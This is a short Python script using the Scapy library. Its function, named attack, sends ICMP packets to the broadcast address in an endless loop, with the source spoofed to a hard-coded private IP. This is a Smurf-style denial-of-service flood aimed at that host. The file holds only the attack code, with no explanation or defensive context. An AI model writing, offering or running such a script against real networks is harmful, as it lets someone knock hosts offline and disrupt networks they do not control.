from scapy.all import *

def attack(target_ip):
    eth = Ether(dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src=target_ip, dst="255.255.255.255")
    icmp = ICMP()

    packet = eth / ip / icmp
    sendp(packet, loop=1, inter=0.1, verbose=0)
        

if __name__ == "__main__":
    attack("192.168.68.76")
